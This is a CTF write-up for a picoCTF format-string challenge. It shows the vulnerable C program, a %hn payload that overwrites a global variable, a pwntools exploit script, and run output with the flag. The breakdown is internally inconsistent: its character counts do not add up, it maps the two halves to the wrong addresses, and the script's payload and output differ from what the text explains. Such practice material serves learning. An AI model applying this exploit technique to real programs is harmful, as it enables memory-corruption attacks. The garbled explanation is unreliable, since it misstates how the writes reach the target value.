# FORMAT STRING 2 WRITE UP

### Source code
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

In the `printf(buf)` line, a format string vulnerability is apparent. By exploiting this vulnerability, we can use the following payload to change the value of `sus` to `0x67616c66`.

### **Payload:**

```python
payload = b'%26464d,%20$hn%1281dAAAA%19$hnx,%40$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00'
```

This payload is constructed to write two parts of the value `0x67616c66` into the `sus` variable, which is located at two consecutive memory addresses (`0x404060` and `0x404062`).

### **Payload Breakdown:**

1. **`%26464d,%20$hn`**:
   - `%26464d`:
     - This prints `26464` characters before the next part of the format string is evaluated. This number is chosen because we want to write the value `0x6761` (in decimal `26465`) into memory.
     - `d` is used to generate an output string with a length of `26464` characters.
   - `%20$hn`:
     - `hn` writes two bytes of the number of characters printed (`26464`) to the memory address specified by the 20th argument on the stack.
     - This address is `0x404060`, which corresponds to the first part of `sus`.

2. **`%1281dAAAA%19$hn`**:
   - `%1281d`:
     - This prints `1281` additional characters, making the total number of printed characters `26464 + 1281 = 27745`.
     - This number is chosen because we want to reach a total of `27750` characters (matching the value `0x6c66` in decimal).
   - `AAAA`:
     - This is 4-byte padding to maintain alignment in the stack data.
   - `%19$hn`:
     - `hn` writes two bytes of the total number of characters printed (`27745`) to the memory address specified by the 19th argument on the stack.
     - This address is `0x404062`, which corresponds to the second part of `sus`.

3. **`x,%40$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00`**:
   - `x`:
     - This might be an error or irrelevant to the main exploit, but generally, `x` does nothing.
   - `,%40$llx`:
     - This prints the value from the address specified in the stack, but it’s not relevant to this exploit.
   - `\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00`:
     - These are the two memory addresses in little-endian format.
     - `\x60\x40\x40\x00\x00\x00\x00\x00` is the first address (`0x404060`).
     - `\x62\x40\x40\x00\x00\x00\x00\x00` is the second address (`0x404062`).

### **How the Payload Works:**

1. **Step One**:
   - The payload starts by printing `26464` characters using `%26464d`.
   - Then, `26464` is printed, making the 20th stack argument ready to be modified.
   - `%20$hn` writes the value `0x6761` (the printed characters plus 1 since `hn` writes 2 bytes) to the address `0x404060`.

2. **Step Two**:
   - The payload then prints an additional `1281` characters using `%1281d`.
   - Now, the total characters printed are `26464 + 1281 = 27745`.
   - `AAAA` is used as padding to maintain alignment in the stack.
   - `%19$hn` then writes the value `0x6c66` to the address `0x404062`.

3. **Final Result**:
   - The value `0x6761` is written to the address `0x404060`.
   - The value `0x6c66` is written to the address `0x404062`.
   - If the payload works correctly, the `sus` variable is now changed from `0x21737573` to `0x67616c66` (which in ASCII is 'gafl'), allowing the exploit to succeed and the program to print the flag.

### Exploit
```python
from pwn import *

io = process('./vuln')

payload = b'%26464d,%20$hn%1281dAAAA%19$hnp,%40$lls,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00'
# r.sendline(b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00DEFGHIJKLMNOPQRSTUVWXYZ')
io.sendline(payload)
io.interactive()
```

```bash=
python3 solve.py

[+] Opening connection to rhea.picoctf.net on port 63309: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input:

I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}

[*] Got EOF while reading in interactive
```

This shows how the exploit works to manipulate the `sus` variable and obtain the flag.
